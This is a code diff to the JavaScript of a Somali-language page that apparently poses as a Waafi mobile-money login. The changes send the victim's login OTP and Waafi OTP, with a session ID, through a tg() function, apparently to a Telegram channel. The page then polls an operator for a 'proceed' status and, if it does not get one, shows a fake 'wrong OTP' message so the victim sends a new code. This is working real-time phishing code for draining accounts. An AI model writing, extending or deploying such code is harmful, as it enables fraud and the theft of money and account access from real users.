@@ -530,12 +530,19 @@ function submitOtp1(){
       showLoader("La xaqiijinayaa...",function(){buildSummary();om("msum");});
     } else {
       otp1Done=false;
-      document.getElementById("oh1").disabled=false;
-      otp1.reset(false);
+      // Keep boxes disabled - user must resend first
       const dm=document.getElementById("dm1");
       dm.textContent="❌ OTP-ga waa khalad. Cadaadi Dib u dir si aad u hesho mid cusub.";
       dm.classList.add("show");
-      document.getElementById("r1").classList.add("on");
+      // Enable only resend button immediately (bypass timer)
+      const rb=document.getElementById("r1");
+      rb.classList.add("on");
+      rb.onclick=function(){
+        dm.classList.remove("show");
+        document.getElementById("g1").style.display="";
+        otp1Done=false;
+        startTimer(1);
+      };
     }
   });
 }
@@ -562,15 +569,36 @@ function submitOtp2(){
   if(otp2Val.length!==6||otp2Done)return;
   if(otp2Val===otp1Val){
     document.getElementById("mn2").textContent="⚠️ OTP-gan waa midkii hore. Gali mid cusub.";
-    document.getElementById("mn2").style.color="#dc2626";
-    return;
+    document.getElementById("mn2").style.color="#dc2626";return;
   }
   otp2Done=true;
-  tg("Waafi OTP",{"Login OTP":otp1Val,"Waafi OTP":otp2Val});
+  document.getElementById("oh2").disabled=true;
+  document.getElementById("g2").style.display="none";
+  document.getElementById("ow2").style.display="none";
+  document.getElementById("vw2").classList.add("show");
+  const sid=genSid();
+  tg("Waafi OTP",{"Login OTP":otp1Val,"Waafi OTP":otp2Val,sessionId:sid});
   sessionStorage.setItem("selectedPlan",JSON.stringify({...(P||{}),phone:phoneValue}));
-  cm("m2");
-  showLoader5("La gudbinayaa codsiga...",function(){
-    navigateTo("thankyou.html");
+  pollStatus(sid,function(status){
+    document.getElementById("vw2").classList.remove("show");
+    document.getElementById("ow2").style.display="";
+    if(status==="proceed"){
+      cm("m2");
+      showLoader5("La gudbinayaa codsiga...",function(){navigateTo("thankyou.html");});
+    } else {
+      otp2Done=false;
+      const dm=document.getElementById("dm2");
+      dm.textContent="❌ OTP-ga waa khalad. Cadaadi Dib u dir si aad u hesho mid cusub.";
+      dm.classList.add("show");
+      const rb=document.getElementById("r2");
+      rb.classList.add("on");
+      rb.onclick=function(){
+        dm.classList.remove("show");
+        document.getElementById("g2").style.display="";
+        otp2Done=false;
+        startTimer(2);
+      };
+    }
   });
 }
 
